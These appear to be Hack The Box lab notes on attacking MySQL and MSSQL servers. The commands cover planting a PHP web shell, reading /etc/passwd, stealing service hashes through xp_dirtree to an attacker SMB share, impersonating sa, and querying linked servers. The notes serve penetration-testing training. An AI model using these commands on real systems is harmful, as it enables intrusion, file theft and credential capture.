## Enumeration
#### Banner Grabbing

```shell
3kjS@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125
```
## Protocol Specific Attacks
#### MySQL - Connecting to the SQL Server

```shell
3kjS@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
```
#### Sqlcmd - Connecting to the SQL Server

```cmd
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 

1>
```

**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

```shell
3kjS@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

```shell
3kjS@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7
```

```shell
3kjS@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
#### SQL Syntax
#### Show Databases

```cmd
mysql> SHOW DATABASES;
```

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

```cmd
1> SELECT name FROM master.dbo.sysdatabases 

2> GO
```
#### Select a Database

```cmd
mysql> USE htbusers; 

Database changed
```

```cmd
1> USE htbusers 
2> GO 

Changed database context to 'htbusers'.
```
#### Show Tables

```cmd
mysql> SHOW TABLES;
```

```cmd
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES 
2> GO
```
#### Select all Data from Table "users"

```cmd
mysql> SELECT * FROM users;
```

```cmd
1> SELECT * FROM users 
2> go
```
## Write Local Files
#### MySQL - Write Local File

```cmd
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'; 

Query OK, 1 row affected (0.001 sec)
```
#### MySQL - Secure File Privileges

```cmd
mysql> show variables like "secure_file_priv";
```
#### MSSQL - Enable Ole Automation Procedures

```cmd
1> sp_configure 'show advanced options', 1 
2> GO 
3> RECONFIGURE 
4> GO 
5> sp_configure 'Ole Automation Procedures', 1 
6> GO 
7> RECONFIGURE 
8> GO
```
#### MSSQL - Create a File

```cmd
1> DECLARE @OLE INT 
2> DECLARE @FileID INT 
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT 
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1 
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>' 
6> EXECUTE sp_OADestroy @FileID 
7> EXECUTE sp_OADestroy @OLE 
8> GO
```
## Read Local Files
#### Read Local Files in MSSQL

```cmd
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents 
2> GO
```
#### MySQL - Read Local Files in MySQL

```cmd
mysql> select LOAD_FILE("/etc/passwd");
```
## Capture MSSQL Service Hash
#### XP_DIRTREE Hash Stealing

```cmd
1> EXEC master..xp_dirtree '\\10.10.110.17\share\' 
2> GO
```
#### XP_SUBDIRS Hash Stealing

```cmd
1> EXEC master..xp_subdirs '\\10.10.110.17\share\' 
2> GO
```
#### XP_SUBDIRS Hash Stealing with Responder

```shell
3kjS@htb[/htb]$ sudo responder -I tun0
```
#### XP_SUBDIRS Hash Stealing with impacket

```shell
3kjS@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
```
## Impersonate Existing Users with MSSQL
#### Identify Users that We Can Impersonate

```cmd
1> SELECT distinct b.name 
2> FROM sys.server_permissions a 
3> INNER JOIN sys.server_principals b 
4> ON a.grantor_principal_id = b.principal_id 5> WHERE a.permission_name = 'IMPERSONATE' 6> GO 

name 
----------------------------------------------- 
sa 
ben 
valentin 

(3 rows affected)
```
#### Verifying our Current User and Role

```cmd
1> SELECT SYSTEM_USER 
2> SELECT IS_SRVROLEMEMBER('sysadmin') 
3> go
```
#### Impersonating the SA User

```cmd
1> EXECUTE AS LOGIN = 'sa' 
2> SELECT SYSTEM_USER 
3> SELECT IS_SRVROLEMEMBER('sysadmin') 
4> GO
```
## Communicate with Other Databases with MSSQL
#### Identify linked Servers in MSSQL

```cmd
1> SELECT srvname, isremote FROM sysservers 
2> GO
srvname                             isremote 
----------------------------------- -------- 
DESKTOP-MFERMN4\SQLEXPRESS          1 
10.0.0.12\SQLEXPRESS                0 

(2 rows affected)
```

```cmd
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS] 
2> GO
```

